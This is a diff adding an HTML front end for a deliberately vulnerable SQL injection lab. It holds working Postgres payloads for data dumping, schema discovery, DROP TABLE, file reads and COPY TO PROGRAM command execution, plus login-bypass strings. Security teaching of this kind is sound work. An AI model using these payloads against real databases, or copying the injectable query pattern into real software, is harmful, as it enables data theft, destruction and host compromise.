@@ -1,0 +1,381 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>SQL Injection Lab — /users/:id</title>
+<style>
+  :root {
+    --bg:#1a1625; --panel:#2a2139; --border:#3f3554;
+    --fg:#f5f0ff; --muted:#a89cc9; --accent:#c4a6ff;
+    --danger:#ff7eb6; --ok:#8eecc0; --warn:#ffd166;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin:0; background:var(--bg); color:var(--fg);
+    font: 14px/1.5 ui-monospace, "Cascadia Code", Menlo, Consolas, monospace;
+  }
+  header {
+    padding:18px 24px; border-bottom:1px solid var(--border);
+    display:flex; align-items:center; justify-content:space-between;
+  }
+  header h1 { margin:0; font-size:18px; }
+  header small { color:var(--muted); }
+  main {
+    display:grid; grid-template-columns: 1fr 1fr; gap:16px;
+    padding:16px; max-width:1400px; margin:0 auto;
+  }
+  .tabs {
+    display:flex; gap:4px; padding: 0 16px; max-width:1400px; margin:0 auto;
+    border-bottom:1px solid var(--border);
+  }
+  .tab {
+    padding:10px 18px; cursor:pointer; color:var(--muted);
+    border-bottom:2px solid transparent; font-size:13px;
+  }
+  .tab.active { color:var(--accent); border-bottom-color:var(--accent); }
+  .view { display:none; }
+  .view.active { display:grid; }
+  label { display:block; color:var(--muted); font-size:12px; margin:8px 0 4px; }
+  section {
+    background:var(--panel); border:1px solid var(--border);
+    border-radius:8px; padding:14px;
+  }
+  h2 { margin:0 0 10px; font-size:14px; color:var(--accent); }
+  .attack {
+    border:1px solid var(--border); border-radius:6px;
+    padding:10px; margin-bottom:10px;
+  }
+  .attack-title {
+    display:flex; justify-content:space-between; align-items:center;
+    margin-bottom:6px;
+  }
+  .attack-title strong { color:var(--warn); }
+  .attack-desc { color:var(--muted); font-size:12px; margin-bottom:8px; }
+  .preview {
+    margin-top:8px; padding:8px 10px; background:#120f1c;
+    border:1px dashed var(--border); border-radius:4px;
+    font-size:12px; white-space:pre-wrap; word-break:break-all;
+  }
+  .preview-label { color:var(--muted); font-size:11px; margin-bottom:3px; }
+  .sql-kw { color:#ff9ecb; }
+  .sql-inj { color:var(--warn); background:rgba(255,209,102,0.18); padding:0 2px; border-radius:2px; }
+  input[type=text] {
+    width:100%; padding:8px 10px; background:#120f1c;
+    color:var(--fg); border:1px solid var(--border); border-radius:4px;
+    font-family:inherit; font-size:13px;
+  }
+  .row { display:flex; gap:6px; margin-top:6px; }
+  button {
+    background:var(--accent); color:#1a1625; border:0; padding:7px 14px;
+    border-radius:4px; cursor:pointer; font-weight:600; font-size:12px;
+    white-space:nowrap;
+  }
+  button.ghost {
+    background:transparent; color:var(--muted); border:1px solid var(--border);
+  }
+  button.danger { background:var(--danger); color:#fff; }
+  button.ok { background:var(--ok); color:#1a1625; }
+  button:hover { filter:brightness(1.1); }
+  pre {
+    background:#120f1c; border:1px solid var(--border);
+    padding:10px; border-radius:4px; overflow:auto;
+    white-space:pre-wrap; word-break:break-all; font-size:12px;
+    max-height:360px;
+  }
+  .url { color:var(--accent); word-break:break-all; }
+  .status-ok { color:var(--ok); }
+  .status-err { color:var(--danger); }
+  .tools {
+    display:flex; gap:8px; margin-bottom:10px; flex-wrap:wrap;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>🧪 SQL Injection Lab — <code>GET /users/:id</code></h1>
+  <small>educational demo · vulnerable on purpose</small>
+</header>
+
+<div class="tabs">
+  <div class="tab active" onclick="showTab('users')">GET /users/:id</div>
+  <div class="tab" onclick="showTab('login')">POST /login</div>
+</div>
+
+<main class="view active" id="view-users">
+  <section>
+    <h2>Attack Payloads</h2>
+    <div class="tools">
+      <button class="ok" onclick="sendRaw('1')">✓ Safe: /users/1</button>
+      <button class="ghost" onclick="health()">health check</button>
+      <button class="danger" onclick="reset()">reset users table</button>
+    </div>
+    <div id="attacks"></div>
+  </section>
+
+  <section>
+    <h2>Response</h2>
+    <div>Request URL: <span class="url" id="lastUrl">—</span></div>
+    <div>Status: <span id="lastStatus">—</span></div>
+    <pre id="lastBody">Send a payload to see the raw SQL query the server built, plus the database response.</pre>
+  </section>
+</main>
+
+<main class="view" id="view-login">
+  <section>
+    <h2>🔐 Login Form — vulnerable <code>POST /login</code></h2>
+    <div class="attack-desc">
+      Server query: <code>SELECT ... WHERE username = '{u}' AND password = '{p}'</code><br>
+      Try classic bypasses below, or type your own.
+    </div>
+
+    <label>Username</label>
+    <input type="text" id="loginUser" value="admin" oninput="updateLoginPreview()" />
+
+    <label>Password</label>
+    <input type="text" id="loginPass" value="' OR '1'='1" oninput="updateLoginPreview()" />
+
+    <div class="preview-label" style="margin-top:10px">🔍 Query that will be executed:</div>
+    <div class="preview" id="loginSql"></div>
+
+    <div class="preview-label" style="margin-top:6px">🌐 HTTP request body:</div>
+    <div class="preview" id="loginBody"></div>
+
+    <div class="row" style="margin-top:10px">
+      <button onclick="sendLogin()">login →</button>
+      <button class="ghost" data-u="admin" data-p="' OR '1'='1">bypass: OR '1'='1</button>
+      <button class="ghost" data-u="admin" data-p="' --">bypass: admin' --</button>
+      <button class="ghost" data-u="' OR 1=1 --" data-p="anything">user-side OR 1=1 --</button>
+      <button class="ghost" data-u="' UNION SELECT 1,'pwned','x','admin' --" data-p="x">UNION inject admin</button>
+      <button class="ok" data-u="alice" data-p="alice123">✓ valid creds</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>Response</h2>
+    <div>Request URL: <span class="url" id="loginUrl">—</span></div>
+    <div>Status: <span id="loginStatus">—</span></div>
+    <pre id="loginResp">Submit to see the exact SQL the server built + DB response.</pre>
+  </section>
+</main>
+
+<script>
+function showTab(name) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+  event.target.classList.add('active');
+  document.getElementById('view-' + name).classList.add('active');
+}
+const attacks = [
+  {
+    level: 1,
+    title: "Basic bypass (OR 1=1)",
+    desc: "Condition always true — dumps every user row.",
+    payload: "1 OR 1=1"
+  },
+  {
+    level: 2,
+    title: "UNION data exfiltration",
+    desc: "Appends attacker-chosen columns. Postgres needs the column count + types to match the users table (id,username,password,email,role).",
+    payload: "0 UNION SELECT id, username, password, email, role FROM users"
+  },
+  {
+    level: 3,
+    title: "Schema discovery (information_schema)",
+    desc: "Discover every table name in the DB by unioning against information_schema.",
+    payload: "0 UNION SELECT table_name::text, table_schema, '-', '-', '-' FROM information_schema.tables"
+  },
+  {
+    level: 4,
+    title: "Stacked query — DROP TABLE",
+    desc: "node-postgres allows multi-statement text queries. The second statement runs after the SELECT. ⚠️ destructive — use /reset after.",
+    payload: "1; DROP TABLE users"
+  },
+  {
+    level: 5,
+    title: "File read (Postgres pg_read_file)",
+    desc: "Postgres analogue of MySQL's LOAD_FILE — only works as superuser, and only inside the data directory by default.",
+    payload: "0 UNION SELECT pg_read_file('postgresql.conf'), '-', '-', '-', '-'"
+  },
+  {
+    level: 6,
+    title: "Command execution (COPY TO PROGRAM)",
+    desc: "Postgres superuser only. COPY ... TO PROGRAM runs a shell command on the DB host. Replace with something harmless to test (e.g. writing a file).",
+    payload: "1; COPY (SELECT 1) TO PROGRAM 'echo pwned > /tmp/pwned.txt'"
+  },
+  {
+    level: 7,
+    title: "Comment-out trailing SQL (--)",
+    desc: "Useful when the vulnerable query has stuff after the injection point you want to ignore.",
+    payload: "1 OR 1=1 --"
+  },
+  {
+    level: 8,
+    title: "Error-based probe (pg_sleep)",
+    desc: "Time-based confirmation the DB is executing your injected SQL.",
+    payload: "1 OR (SELECT pg_sleep(2)) IS NULL"
+  }
+];
+
+const root = document.getElementById('attacks');
+attacks.forEach((a, i) => {
+  const div = document.createElement('div');
+  div.className = 'attack';
+  div.innerHTML = `
+    <div class="attack-title">
+      <strong>Level ${a.level}: ${a.title}</strong>
+    </div>
+    <div class="attack-desc">${a.desc}</div>
+    <input type="text" id="p${i}" value="${escapeHtml(a.payload)}" oninput="updatePreview(${i})" />
+    <div class="preview-label" style="margin-top:8px">🔍 Query that will be executed on the server:</div>
+    <div class="preview" id="sql${i}"></div>
+    <div class="preview-label" style="margin-top:6px">🌐 HTTP request:</div>
+    <div class="preview" id="url${i}"></div>
+    <div class="row">
+      <button onclick="send(${i})">send →</button>
+      <button class="ghost" onclick="copyUrl(${i})">copy URL</button>
+    </div>
+  `;
+  root.appendChild(div);
+  updatePreview(i);
+});
+
+function highlightSql(sql, injected) {
+  const kws = ['SELECT','FROM','WHERE','UNION','DROP','TABLE','COPY','TO','PROGRAM','OR','AND','INSERT','INTO','VALUES','NULL','IS'];
+  let safe = escapeHtml(sql);
+  const injEsc = escapeHtml(injected);
+  safe = safe.replace(injEsc, `<span class="sql-inj">${injEsc}</span>`);
+  kws.forEach(k => {
+    const re = new RegExp('\\b(' + k + ')\\b', 'g');
+    safe = safe.replace(re, '<span class="sql-kw">$1</span>');
+  });
+  return safe;
+}
+
+function updatePreview(i) {
+  const payload = document.getElementById('p' + i).value;
+  const sql = `SELECT * FROM users WHERE id = ${payload}`;
+  document.getElementById('sql' + i).innerHTML = highlightSql(sql, payload);
+  document.getElementById('url' + i).textContent =
+    'GET ' + location.origin + buildUrl(payload);
+}
+
+function escapeHtml(s) {
+  return s.replace(/[&<>"']/g, c => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  }[c]));
+}
+
+function buildUrl(payload) {
+  return '/users/' + encodeURIComponent(payload);
+}
+
+async function send(i) {
+  const payload = document.getElementById('p' + i).value;
+  await fire(buildUrl(payload));
+}
+
+async function sendRaw(payload) {
+  await fire(buildUrl(payload));
+}
+
+async function fire(url) {
+  document.getElementById('lastUrl').textContent = decodeURIComponent(url);
+  document.getElementById('lastStatus').textContent = '… sending';
+  document.getElementById('lastBody').textContent = '';
+  try {
+    const res = await fetch(url);
+    const text = await res.text();
+    let body = text;
+    try { body = JSON.stringify(JSON.parse(text), null, 2); } catch {}
+    const statusEl = document.getElementById('lastStatus');
+    statusEl.textContent = res.status + ' ' + res.statusText;
+    statusEl.className = res.ok ? 'status-ok' : 'status-err';
+    document.getElementById('lastBody').textContent = body;
+  } catch (e) {
+    document.getElementById('lastStatus').textContent = 'network error';
+    document.getElementById('lastBody').textContent = e.message;
+  }
+}
+
+function copyUrl(i) {
+  const payload = document.getElementById('p' + i).value;
+  const url = location.origin + buildUrl(payload);
+  navigator.clipboard.writeText(url);
+}
+
+async function health() {
+  await fire('/health');
+}
+
+function fillLogin(u, p) {
+  document.getElementById('loginUser').value = u;
+  document.getElementById('loginPass').value = p;
+  updateLoginPreview();
+}
+
+document.querySelectorAll('button[data-u]').forEach(btn => {
+  btn.addEventListener('click', () => {
+    fillLogin(btn.dataset.u, btn.dataset.p);
+  });
+});
+
+function updateLoginPreview() {
+  const u = document.getElementById('loginUser').value;
+  const p = document.getElementById('loginPass').value;
+  const sql = `SELECT id, username, email, role FROM users WHERE username = '${u}' AND password = '${p}'`;
+  let safe = escapeHtml(sql);
+  [u, p].forEach(v => {
+    if (v) {
+      const esc = escapeHtml(v);
+      safe = safe.replace(esc, `<span class="sql-inj">${esc}</span>`);
+    }
+  });
+  ['SELECT','FROM','WHERE','AND','OR','UNION'].forEach(k => {
+    safe = safe.replace(new RegExp('\\b(' + k + ')\\b','g'), '<span class="sql-kw">$1</span>');
+  });
+  document.getElementById('loginSql').innerHTML = safe;
+  document.getElementById('loginBody').textContent =
+    'POST /login\nContent-Type: application/json\n\n' +
+    JSON.stringify({ username: u, password: p }, null, 2);
+}
+updateLoginPreview();
+
+async function sendLogin() {
+  const u = document.getElementById('loginUser').value;
+  const p = document.getElementById('loginPass').value;
+  document.getElementById('loginUrl').textContent = 'POST /login';
+  document.getElementById('loginStatus').textContent = '… sending';
+  document.getElementById('loginResp').textContent = '';
+  try {
+    const res = await fetch('/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: u, password: p })
+    });
+    const text = await res.text();
+    let body = text;
+    try { body = JSON.stringify(JSON.parse(text), null, 2); } catch {}
+    const statusEl = document.getElementById('loginStatus');
+    statusEl.textContent = res.status + ' ' + res.statusText;
+    statusEl.className = res.ok ? 'status-ok' : 'status-err';
+    document.getElementById('loginResp').textContent = body;
+  } catch (e) {
+    document.getElementById('loginStatus').textContent = 'network error';
+    document.getElementById('loginResp').textContent = e.message;
+  }
+}
+
+async function reset() {
+  document.getElementById('lastUrl').textContent = 'POST /reset';
+  document.getElementById('lastStatus').textContent = '… resetting';
+  const res = await fetch('/reset', { method: 'POST' });
+  const body = await res.json();
+  document.getElementById('lastStatus').textContent = res.status + ' ' + res.statusText;
+  document.getElementById('lastBody').textContent = JSON.stringify(body, null, 2);
+}
+</script>
+
+</body>
+</html>
